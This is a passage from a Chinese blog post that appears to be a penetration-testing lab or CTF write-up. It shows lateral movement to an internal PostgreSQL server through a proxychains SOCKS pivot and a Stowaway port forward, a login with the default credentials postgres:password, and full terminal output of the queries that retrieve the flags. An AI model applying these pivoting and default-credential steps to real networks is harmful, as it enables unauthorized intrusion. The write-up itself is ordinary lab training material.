+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725200243894.png" alt="image-20240725200243894"></p>
+<p>flag在&#x2F;flag.txt：<code>WSS-Studio&#123;Struts2-b086a0a3-2b93-4b8a-981b-ca00d360e773&#125;</code></p>
+<hr>
+<h1 id="PostgresSQL"><a href="#PostgresSQL" class="headerlink" title="PostgresSQL"></a>PostgresSQL</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[+] Postgres:172.56.102.2:5432:postgres password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>账密<code>postgres:password</code></p>
+<p>修改kali中proxychains工具的&#x2F;etc&#x2F;proxychains4.conf，改成我们的socks代理地址</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725211219637.png" alt="image-20240725211219637"></p>
+<p>然后在<code>proxychains</code>下使用<code>pgcli</code>远程连接，接下来就是查询</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>
+└─$ proxychains pgcli <span class="token parameter variable">-h</span> <span class="token number">172.56</span>.102.2 <span class="token parameter variable">-u</span> postgres
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains4.conf
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.16</span>
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OK
+Password <span class="token keyword">for</span> postgres: 
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OK
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432 Server: PostgreSQL <span class="token number">16.3</span>
+Version: <span class="token number">3.4</span>.1
+Home: http://pgcli.com
+postgres@172:postgres<span class="token operator">></span>  <span class="token punctuation">..</span>.  OK
+postgres@172:postgres<span class="token operator">></span> <span class="token punctuation">\</span>l
++-----------+----------+----------+------------+------------+-----------------------+
+<span class="token operator">|</span> Name      <span class="token operator">|</span> Owner    <span class="token operator">|</span> Encoding <span class="token operator">|</span> Collate    <span class="token operator">|</span> Ctype      <span class="token operator">|</span> Access privileges     <span class="token operator">|</span>
+<span class="token operator">|</span>-----------+----------+----------+------------+------------+-----------------------<span class="token operator">|</span>
+<span class="token operator">|</span> flag      <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">&lt;</span>null<span class="token operator">></span>                <span class="token operator">|</span>
+<span class="token operator">|</span> postgres  <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">&lt;</span>null<span class="token operator">></span>                <span class="token operator">|</span>
+<span class="token operator">|</span> template0 <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">=</span>c/postgres           <span class="token operator">|</span>
+<span class="token operator">|</span>           <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>            <span class="token operator">|</span>            <span class="token operator">|</span> <span class="token assign-left variable">postgres</span><span class="token operator">=</span>CTc/postgres <span class="token operator">|</span>
+<span class="token operator">|</span> template1 <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">=</span>c/postgres           <span class="token operator">|</span>
+<span class="token operator">|</span>           <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>            <span class="token operator">|</span>            <span class="token operator">|</span> <span class="token assign-left variable">postgres</span><span class="token operator">=</span>CTc/postgres <span class="token operator">|</span>
++-----------+----------+----------+------------+------------+-----------------------+
+SELECT <span class="token number">4</span>
+Time: <span class="token number">0</span>.052s
+postgres@172:postgres<span class="token operator">></span> <span class="token punctuation">\</span>c flag
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OK
+You are now connected to database <span class="token string">"flag"</span> as user <span class="token string">"postgres"</span>
+Time: <span class="token number">0</span>.590s
+postgres@172:flag<span class="token operator">></span> <span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OK
+postgres@172:flag<span class="token operator">></span> <span class="token punctuation">\</span>dt
++--------+------+-------+----------+
+<span class="token operator">|</span> Schema <span class="token operator">|</span> Name <span class="token operator">|</span> Type  <span class="token operator">|</span> Owner    <span class="token operator">|</span>
+<span class="token operator">|</span>--------+------+-------+----------<span class="token operator">|</span>
+<span class="token operator">|</span> public <span class="token operator">|</span> flag <span class="token operator">|</span> table <span class="token operator">|</span> postgres <span class="token operator">|</span>
++--------+------+-------+----------+
+SELECT <span class="token number">1</span>
+Time: <span class="token number">1</span>.853s <span class="token punctuation">(</span><span class="token number">1</span> second<span class="token punctuation">)</span>, executed in: <span class="token number">1</span>.851s <span class="token punctuation">(</span><span class="token number">1</span> second<span class="token punctuation">)</span>
+postgres@172:flag<span class="token operator">></span> SELECT * FROM flag
++-------------------------------------------------------------+
+<span class="token operator">|</span> data                                                        <span class="token operator">|</span>
+<span class="token operator">|</span>-------------------------------------------------------------<span class="token operator">|</span>
+<span class="token operator">|</span> WSS-Studio<span class="token punctuation">&#123;</span>Postgresql-cb6cba4a-6d7b-43b6-bfc4-0146b0d0e5af<span class="token punctuation">&#125;</span> <span class="token operator">|</span>
++-------------------------------------------------------------+
+SELECT <span class="token number">1</span>
+Time: <span class="token number">0</span>.050s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>法二：stowaway直接转发这个数据库的端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>node <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">>></span> forward <span class="token number">9000</span> <span class="token number">172.56</span>.102.2:5432<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725212738296.png" alt="image-20240725212738296"></p>
+<p>然后navicat连接127.0.0.1:9000</p>
+<p>如果navicat连接时报错：<code>column &quot;datlastsysoid&quot; does not exist  Line1:SELECT DISTINCT datalastsysoid FROM pg_database</code></p>
+<p>请参考这篇文章修改对应的dll文件：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2314524">https://cloud.tencent.com/developer/article/2314524</a></p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725212821261.png" alt="image-20240725212821261"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
